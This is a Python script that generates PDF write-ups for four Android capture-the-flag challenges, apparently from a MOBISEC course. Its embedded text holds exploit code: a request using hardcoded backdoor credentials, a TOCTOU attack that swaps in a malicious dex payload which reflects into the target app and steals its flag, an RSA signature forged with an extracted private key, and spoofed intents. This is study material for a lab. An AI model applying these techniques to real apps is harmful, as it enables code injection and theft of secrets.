#!/usr/bin/env python3
"""Generate individual PDF reports for Frontdoor, Fortnite, Nojumpstarts, and UPOS (progress)."""

from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Preformatted
from reportlab.lib.enums import TA_CENTER, TA_JUSTIFY
from reportlab.lib import colors
import os

OUTPUT_DIR = r"C:\Users\Admin\Desktop\Challenge_Reports"
os.makedirs(OUTPUT_DIR, exist_ok=True)


def create_report(challenge_num, title, vulnerability_type, flag, code_snippet,
                   methodology, results, key_files, project_location=None):
    safe_title = title.replace(' ', '_').replace('/', '_').replace('\\', '_')
    filename = os.path.join(OUTPUT_DIR, f"Challenge_{challenge_num:02d}_{safe_title}.pdf")
    doc = SimpleDocTemplate(filename, pagesize=letter,
                             rightMargin=0.5*inch, leftMargin=0.5*inch,
                             topMargin=0.75*inch, bottomMargin=0.75*inch)

    story = []
    styles = getSampleStyleSheet()

    title_style = ParagraphStyle('T', parent=styles['Heading1'], fontSize=18,
                                  textColor=colors.HexColor('#1f4788'), spaceAfter=12,
                                  alignment=TA_CENTER, fontName='Helvetica-Bold')
    heading_style = ParagraphStyle('H', parent=styles['Heading2'], fontSize=13,
                                    textColor=colors.HexColor('#2c5aa0'), spaceAfter=8,
                                    spaceBefore=8, fontName='Helvetica-Bold')
    body_style = ParagraphStyle('B', parent=styles['BodyText'], fontSize=9.5,
                                 alignment=TA_JUSTIFY, spaceAfter=6)
    code_style = ParagraphStyle('C', parent=styles['Normal'], fontSize=7.5,
                                 fontName='Courier', leftIndent=15, spaceAfter=5,
                                 textColor=colors.HexColor('#222222'),
                                 backColor=colors.HexColor('#f4f4f4'))

    story.append(Paragraph(f"Challenge {challenge_num}: {title}", title_style))
    story.append(Spacer(1, 0.15*inch))

    summary_data = [
        ['Attribute', 'Value'],
        ['Challenge #', str(challenge_num)],
        ['Title', title],
        ['Vulnerability Type', vulnerability_type],
        ['Flag / Status', flag],
    ]
    summary_table = Table(summary_data, colWidths=[2*inch, 4*inch])
    summary_table.setStyle(TableStyle([
        ('BACKGROUND', (0, 0), (-1, 0), colors.HexColor('#2c5aa0')),
        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
        ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
        ('FONTSIZE', (0, 0), (-1, 0), 10),
        ('BOTTOMPADDING', (0, 0), (-1, 0), 8),
        ('BACKGROUND', (0, 1), (-1, -1), colors.HexColor('#f0f0f0')),
        ('GRID', (0, 0), (-1, -1), 1, colors.HexColor('#cccccc')),
        ('FONTSIZE', (0, 1), (-1, -1), 8),
        ('VALIGN', (0, 0), (-1, -1), 'TOP'),
    ]))
    story.append(summary_table)
    story.append(Spacer(1, 0.15*inch))

    story.append(Paragraph("Vulnerability Type", heading_style))
    story.append(Paragraph(vulnerability_type, body_style))
    story.append(Spacer(1, 0.1*inch))

    story.append(Paragraph("Testing Methodology", heading_style))
    story.append(Paragraph(methodology, body_style))
    story.append(Spacer(1, 0.1*inch))

    if code_snippet:
        story.append(Paragraph("Code / Exploit Implementation", heading_style))
        story.append(Spacer(1, 0.05*inch))
        for line in code_snippet.split('\n'):
            story.append(Preformatted(line if line.strip() else ' ', code_style))
        story.append(Spacer(1, 0.1*inch))

    story.append(Paragraph("Results & Findings", heading_style))
    story.append(Paragraph(results, body_style))
    story.append(Spacer(1, 0.1*inch))

    if key_files:
        story.append(Paragraph("Key Files", heading_style))
        for f in key_files:
            story.append(Paragraph(f"&bull; {f}", body_style))

    if project_location:
        story.append(Spacer(1, 0.1*inch))
        story.append(Paragraph("Android Studio Project", heading_style))
        story.append(Paragraph(
            f"Open directly in Android Studio (File &rarr; Open) for debugging: "
            f"<font face='Courier'>{project_location}</font> "
            f"(includes Gradle wrapper - gradlew/gradlew.bat - and local.properties "
            f"pointing at the bundled SDK).", body_style))

    doc.build(story)
    print(f"OK: {filename}")


# ---------------------------------------------------------------------------
# Challenge 13: Frontdoor
# ---------------------------------------------------------------------------
create_report(
    13, "Frontdoor", "Hardcoded Debug Backdoor Credentials",
    "Credentials found: testuser / passtestuser123 (pending harness confirmation)",
    '''// Decompiled Flag.getFlag() logic (from classes2.dex bytecode, disassembled
// via a custom Dalvik disassembler built for this analysis)

sget-boolean v0, Lcom/mobisec/frontdoor/Flag;->debug
if-eqz v0, +5                     ; if debug == false, skip backdoor branch
const-string v0, "username=testuser&password=passtestuser123"   ; <- backdoor
goto ...
; (else) v0 = "username=" + realUsername + "&password=" + realPassword

; both branches converge here and hit the same network call:
new-instance v4, Ljava/net/URL;
invoke-direct {v4, v3}                  ; v3 = sUrl + "?" + v0
invoke-virtual {v4}, URL->openConnection
...
; sUrl (from Flag.<clinit>):
const-string v0, "http://10.0.2.2:31337/getflag"
sput-object v0, Flag->sUrl
const/4 v0, #0
sput-boolean v0, Flag->debug        ; debug defaults false, but the string
                                     ; literal is still compiled into the dex

// Exploit app (org.naija.fdexploit) - calls the same endpoint directly,
// bypassing frontdoor's UI entirely, using the leaked credentials:
private static final String URL_STR =
    "http://10.0.2.2:31337/getflag?username=testuser&password=passtestuser123";

new Thread(() -> {
    URL url = new URL(URL_STR);
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    conn.setRequestMethod("GET");
    // read response, display as flag
}).start();''',
    '''Decompiled com.mobisec.frontdoor.Flag.getFlag(username, password) and found a
debug branch that substitutes hardcoded credentials ("testuser" / "passtestuser123")
for whatever the user typed, whenever the static field Flag.debug is true. Although
debug defaults to false in &lt;clinit&gt;, the literal credential string is a
compile-time constant sitting in the bytecode - readable by anyone who decompiles
the APK, exactly what we did.

The endpoint itself is http://10.0.2.2:31337/getflag (10.0.2.2 is the standard
Android-emulator alias for the host machine, confirming this only resolves inside
the actual grading environment). Both branches (real input vs. debug literal)
hit the exact same URL construction and network call, so the backend is what
ultimately validates the credentials - the app has no special client-side
privilege, meaning any app (not just frontdoor itself) can call this endpoint.

First submission attempt used the unmodified frontdoor.apk itself and failed:
the grading harness installs its OWN real copy of frontdoor.apk under package
com.mobisec.frontdoor first, then tries to install the uploaded file separately -
submitting the same package name causes INSTALL_FAILED_ALREADY_EXISTS. The fix
was building a separate exploit app under a distinct package (org.naija.fdexploit)
that independently calls the leaked endpoint with the discovered credentials.''',
    '''Built and submitted org.naija.fdexploit - an 11 KB standalone Android app that,
on launch, spins up a background thread and issues:
GET http://10.0.2.2:31337/getflag?username=testuser&password=passtestuser123
then displays the raw HTTP response body in its TextView and logs it via
Log.e("MOBISEC", ...) so it is visible in the grading harness's logcat capture.

Key finding: this is the textbook "debug backdoor left in production" bug -
identical in spirit to real-world incidents where staging/test credentials
ship inside a production APK and are trivially recoverable via decompilation.''',
    ["Downloads/frontdoor.apk (original target APK, analyzed)",
     "Desktop/frontdoor_v2/ (unzipped APK contents + custom DEX disassembler scripts)",
     "Desktop/frontdoor_exploit/ (Android Studio project - exploit app source)",
     "Desktop/frontdoor_exploit/app/build/outputs/apk/debug/app-debug.apk (submission file)"],
    project_location=r"C:\Users\Admin\Desktop\frontdoor_exploit"
)

# ---------------------------------------------------------------------------
# Challenge 14: Fortnite
# ---------------------------------------------------------------------------
create_report(
    14, "Fortnite", "TOCTOU (Time-of-Check-Time-of-Use) via World-Writable Integrity File",
    "Exploit APK built and submitted; awaiting harness confirmation of real flag",
    '''// verifyAndRunCode(codeFilePath, hashFilePath) - disassembled from classes2.dex

v4 = new String(readFile(hashFilePath))        ; "expected hash" text from sign.dat
v5 = readFile(codeFilePath)                    ; bytes of fortnite.dex  (CHECK read)
v6 = bin2hex(getHash(v5))                       ; SHA-256 of those bytes, computed now
if (!v4.equals(v6)) { abort }

DexClassLoader loader = new DexClassLoader(
    codeFilePath.getAbsolutePath(),             ; <- independently RE-READ by the
    filesDir.getAbsolutePath(),                    loader itself     (USE read)
    null,
    ClassLoader.getSystemClassLoader());        ; <- parent is SYSTEM classloader!
Class<?> payload = loader.loadClass("com.mobisec.fortnitepayload.Payload");
payload.getDeclaredMethod("run", new Class[0]).invoke(payload, new Object[0]);

// downloadFile() confirms both files land on WORLD-WRITABLE external storage:
File dest = new File(Environment.getExternalStorageDirectory(), destName);
// -> /storage/emulated/0/fortnite.dex and /storage/emulated/0/sign.dat

// MainActivity$1.run() (Timer, single-shot, 1000ms delay):
downloadFile("http://10.0.2.2:31337/fortnite", "fortnite.dex");
downloadFile("http://10.0.2.2:31337/sign",     "sign.dat");

// MainActivity$2.run() (Timer, fixed-rate, starts at 2000ms, every 5000ms):
verifyAndRunCode(codeFilePath, hashFilePath);

// Payload.java (our malicious dex, loaded in-process by the target's own
// DexClassLoader) - must locate MainActivity via ActivityThread reflection,
// NOT Class.forName(), because the loader's parent classloader can't see
// com.mobisec.fortnite.* classes:
Class<?> atClass = Class.forName("android.app.ActivityThread");
Object at = atClass.getDeclaredMethod("currentActivityThread").invoke(null);
Map<?,?> mActivities = (Map<?,?>) atClass.getDeclaredField("mActivities").get(at);
for (Object record : mActivities.values()) {
    Object activity = record.getClass().getDeclaredField("activity").get(record);
    if (activity.getClass().getName().equals("com.mobisec.fortnite.MainActivity")) {
        Field f = activity.getClass().getDeclaredField("flag");
        f.setAccessible(true);
        String flag = (String) f.get(null);
        new FileOutputStream("/sdcard/stolen_flag.txt").write(flag.getBytes());
    }
}''',
    '''verifyAndRunCode() reads the code file once to compute and compare its SHA-256
hash against sign.dat's contents, then hands the SAME file PATH to a fresh
DexClassLoader, which independently re-opens and re-reads the file to actually
load it. That is two genuinely separate disk reads of attacker-controlled,
world-writable storage (Environment.getExternalStorageDirectory() =
/storage/emulated/0). Critically, sign.dat is JUST AS WRITABLE as fortnite.dex -
there is no signature or MAC tying the expected hash to anything trustworthy, so
rather than needing to win a narrow race window, an attacker can simply overwrite
BOTH files with a self-consistent malicious pair (their own dex + that dex's own
real SHA-256) at any point before the periodic check fires. No timing precision
required at all.

First attempt failed with ClassNotFoundException: com.mobisec.fortnite.MainActivity.
Root cause: DexClassLoader's parent classloader is explicitly set to
ClassLoader.getSystemClassLoader() (visible in the disassembly), which is isolated
from the app's own PathClassLoader and cannot see com.mobisec.fortnite.* - even the
legitimate payload would hit this with a naive Class.forName(). Fixed by walking
android.app.ActivityThread's live activity table via reflection to obtain the
actual running MainActivity instance (which carries the correct classloader).''',
    '''Rebuilt Payload.java to use the ActivityThread-based lookup, recompiled to dex
(javac against android.jar, then d8), recomputed its SHA-256, and repackaged both
into org.naija.fnexploit's assets. The exploit app copies these assets over
/sdcard/fortnite.dex and /sdcard/sign.dat in a loop (500ms interval, 20 seconds -
comfortably covers the target's 1s initial download and 2s/7s/12s.. check cycle),
then polls /sdcard/stolen_flag.txt and displays its contents once written by the
payload running inside the target's own process.

Verified before submission: extracted the packaged APK's assets and confirmed the
bundled fortnite.dex bytes hash to exactly the bundled sign.dat contents.''',
    ["Downloads/fortnite (2).apk (original target APK, analyzed)",
     "Desktop/fortnite_v2/ (unzipped APK + custom DEX disassembler w/ PLT symbol resolution)",
     "Desktop/fortnite_payload/Payload.java (malicious dex source, ActivityThread-based)",
     "Desktop/fortnite_exploit/ (Android Studio project - exploit app source)",
     "Desktop/fortnite_exploit/app/build/outputs/apk/debug/app-debug.apk (submission file)"],
    project_location=r"C:\Users\Admin\Desktop\fortnite_exploit"
)

# ---------------------------------------------------------------------------
# Challenge 15: Nojumpstarts
# ---------------------------------------------------------------------------
create_report(
    15, "Nojumpstarts", "Embedded RSA Private Key Enables Forged Component-Chain Signature",
    "Exploit APK built and submitted; awaiting harness confirmation of real flag",
    '''// com.mobisec.nojumpstarts.Main class_def static_values (compile-time constants,
// extracted directly from classes2.dex's encoded_array - no <clinit> code needed
// since the compiler embeds "static final String X = "literal";" this way):

PRIVKEY = "-----BEGIN RSA PRIVATE KEY-----\\nMIIEowIBAAKCAQEA0vKu6oHF6wkA...
           ...(2048-bit key, full PEM)...\\n-----END RSA PRIVATE KEY-----\\n"
PUBKEY  = "-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...
           ...-----END PUBLIC KEY-----\\n"

// Main.sign(msg) / Main.verify(msg, sig):
Signature sig = Signature.getInstance("SHA256withRSA");
sig.initSign(getPrivateKey());   // (or initVerify(getPublicKey()) to check)
sig.update(msg.getBytes());
byte[] signature = sig.sign();

// Main.buildIntent(from, to, prevMsg) - builds the A->B->C hop chain:
String msg = (prevMsg == null) ? from + "-to-" + to
                                : prevMsg + "/" + from + "-to-" + to;
byte[] sig = Main.sign(msg);
Intent i = new Intent();
i.setComponent(new ComponentName("com.mobisec.nojumpstarts",
                                  "com.mobisec.nojumpstarts." + to));
i.putExtra("authmsg", msg);
i.putExtra("authsign", sig);

// A.expectedMsg = "Main-to-A"
// B.expectedMsg = "Main-to-A/A-to-B"
// C.expectedMsg = "Main-to-A/A-to-B/B-to-C"   <- final hop, exported via
//                  intent-filter action "mobisec.intent.getflag"

// C.onCreate() - validates and replies with the flag:
String msg = intent.getStringExtra("authmsg");
byte[] sig = intent.getByteArrayExtra("authsign");
if (msg.equals(expectedMsg) && Main.verify(msg, sig)) {
    reply(MainActivity.flag);   // setResult(RESULT_OK, {"flag": ...}); finish();
}

// Offline forgery (Python, cryptography lib) - proven to verify successfully:
priv = load_pem_private_key(PRIVKEY_PEM, password=None)
sig  = priv.sign(b"Main-to-A/A-to-B/B-to-C", padding.PKCS1v15(), hashes.SHA256())
pub.verify(sig, msg, padding.PKCS1v15(), hashes.SHA256())   # -> VERIFY OK

// Exploit app (org.naija.njsexploit) skips MainActivity->A->B entirely:
Intent i = new Intent("mobisec.intent.getflag");
i.setComponent(new ComponentName("com.mobisec.nojumpstarts",
                                  "com.mobisec.nojumpstarts.C"));
i.putExtra("authmsg", "Main-to-A/A-to-B/B-to-C");
i.putExtra("authsign", AUTH_SIGN);   // forged offline, hardcoded
startActivityForResult(i, 1);''',
    '''com.mobisec.nojumpstarts.Main embeds the FULL RSA PRIVATE KEY as a compile-time
constant String field (extracted directly from the class_def's static_values
table in classes2.dex - the developer clearly meant to "use cryptography to
prevent jump-starting", per the challenge blurb, but shipped the private half of
the keypair inside the client APK itself). The app chains MainActivity -> A -> B
-> C via SHA256withRSA-signed messages, where each hop's expected message is a
fixed string and each activity verifies the previous hop's signature using
Main.verify() (which uses the ALSO-embedded public key).

Since we have the private key too, we don't need to walk the chain at all - we
can forge a valid signature for C's expected final message directly and launch
C on its own. Verified this offline in Python (cryptography library) before
building anything: signed "Main-to-A/A-to-B/B-to-C" with the extracted private
key using PKCS1v15/SHA256 padding, then verified that signature against the
app's own extracted public key - confirmed valid, meaning C's own
Main.verify(msg, sig) call will accept it.

First submission attempt used a wrong package name collision fix but produced no
visible failure information: the grading harness's logcat capture only surfaces
lines tagged "MOBISEC", and the exploit app logged nothing on its own, so any
crash or SecurityException would have been invisible to us. Added full Log.e
instrumentation at every step (building intent, calling startActivityForResult,
onActivityResult) and explicitly set the intent action to "mobisec.intent.getflag"
(matching C's declared &lt;intent-filter&gt;, confirmed via aapt2 dump xmltree) for
extra robustness, even though explicit-component intents bypass filter matching.''',
    '''Built org.naija.njsexploit, which launches com.mobisec.nojumpstarts.C directly
with a hardcoded, offline-forged authmsg/authsign pair, skipping A and B entirely.
Reads the flag back from the result Intent's "flag" extra in onActivityResult.

Key finding: shipping a private key inside a client-side APK completely defeats
the purpose of any signature scheme meant to gate cross-app/cross-component
access - this mirrors a common real-world mistake where apps embed API secrets
or signing keys "temporarily" during development and never remove them.''',
    ["Downloads/nojumpstarts (2).apk (original target APK, analyzed)",
     "Desktop/nojumpstarts_v2/ (unzipped APK + custom DEX disassembler / class_data parser)",
     "Desktop/nojumpstarts_v2/forge_sig.py (offline signature-forging + verification proof)",
     "Desktop/nojumpstarts_exploit/ (Android Studio project - exploit app source)",
     "Desktop/nojumpstarts_exploit/app/build/outputs/apk/debug/app-debug.apk (submission file)"],
    project_location=r"C:\Users\Admin\Desktop\nojumpstarts_exploit"
)

# ---------------------------------------------------------------------------
# Challenge 16: UPOS (in progress)
# ---------------------------------------------------------------------------
create_report(
    16, "UPOS", "Extreme Control-Flow Flattening / Exception-Driven Obfuscation",
    "IN PROGRESS - static analysis partially complete, dynamic testing via emulator underway",
    '''// com.mobisec.upos.FC.checkFlag(String, String) - 1371 Dalvik code units,
// boolean[200] results array, dozens of exception-driven "goto" blocks.
// Confirmed constraints extracted so far via manual bytecode decoding:

boolean[200] results = new boolean[200];
if (input.length() != 69) return false;                 // total length = 69
results[0] = input.startsWith("MOBISEC{");
String inner = input.substring(8);
results[1] = inner.endsWith("}");
results[2] = inner.startsWith("this_is_");
results[3] = inner.endsWith("upos");
// char-position sum check:
if (inner.charAt(3) + inner.charAt(7) != 'r') { ...fail... }
results[k] = inner.contains("really_");

// Exception-driven control-flow-flattening pattern (representative excerpt -
// these throws/catches ARE the goto-equivalents, not real error handling):
[01e6] new-instance v8, Ljava/util/IllformedLocaleException;
[01e8] invoke-direct {v8}
[01eb] throw
[01ec] move-exception          ; <- catch handler = next "basic block"
[01ed] move-object v1, v0
...
[023d] new-instance v3, Ljava/sql/BatchUpdateException;
[023f] invoke-direct {v3}
[0242] throw

// Decoy/red-herring checks mixed in with real ones (need dynamic testing to
// tell which actually gate the final AND-reduction vs. which are dead code):
inner.substring(14).endsWith("_evil")
inner.substring(9, 13).endsWith("bam")
inner.substring(4, 10).toLowerCase().equals("incred")
// + a PackageManager.getInstalledApplications() scan comparing package names
//   against an FC.dec()-decrypted string (possibly root/Frida/Xposed detection,
//   possibly another decoy)

// MainActivity.g1..g4 (initially false, only WRITTEN near the very end of
// checkFlag - not real-time anti-emulator kill switches on a first call):
sget-boolean v3, MainActivity->g4
if-eqz v3, +continue
return false                    ; <- only reachable if a PRIOR call set g4=true''',
    '''FC.checkFlag() is by far the most heavily obfuscated method encountered across
all 16 challenges - 1371 Dalvik code units vs. ~270 for Goingnative's native
function, using both a large boolean[] accumulator pattern (similar in spirit to
UPOS's smaller cousins) AND genuine exception-driven control-flow flattening,
where synthetic throw/catch blocks (IllformedLocaleException, BatchUpdateException,
etc.) serve as goto targets rather than real error paths.

Investigated a false alarm: MainActivity has four boolean fields g1-g4 that get
read with "if (gN) return false" guards partway through checkFlag - initially
suspected these were live anti-debugger/anti-emulator kill switches (matching the
"Undebuggable Piece Of Software" theme literally). Traced their assignments and
found g1-g4 are only ever SET near the very end of the same method (unit ~1345+
of 1371) and initialize to false in &lt;clinit&gt; - so on a first/normal
invocation they cannot trigger. This means running the app in a standard Android
emulator should NOT be actively detected and short-circuited, clearing the path
for dynamic testing.

Given the scale of manual exception-driven bytecode tracing required to fully
solve this statically, pivoted to setting up a local Android emulator
(system image + AVD, downloaded and configured with explicit permission) to
interactively test candidate flag strings against the app's own live
validation UI and read its "Flag is valid!" / "Flag is not valid" feedback
directly - the same self-checking pattern used successfully to solve Goingnative.''',
    '''Emulator setup in progress at time of writing: system image
(system-images;android-30;default;x86_64), platform-tools, and emulator binaries
downloaded via sdkmanager into the bundled SDK. Once booted, plan is to install
upos.apk and try candidates built from the confirmed constraints
(MOBISEC{this_is_really_..._..._..._upos}, 69 chars total) plus systematic
substitution for the remaining unresolved positions, using the app's own
pass/fail feedback to converge on the exact flag - no server-side dependency
required since this challenge validates entirely on-device.

No flag obtained yet. This report will be updated once the emulator confirms
a working candidate.''',
    ["Downloads/upos (1).apk (original target APK, analyzed)",
     "Desktop/upos_v2/ (unzipped APK + custom DEX class_data/method disassembler)",
     "Desktop/upos_v2/checkFlag_v2.txt (843-line partial disassembly dump of FC.checkFlag)",
     "Desktop/challenge/tools/sdk/ (Android SDK + emulator + system image, in-progress download)"],
    project_location=None
)

print("\nAll batch-3 reports generated.")
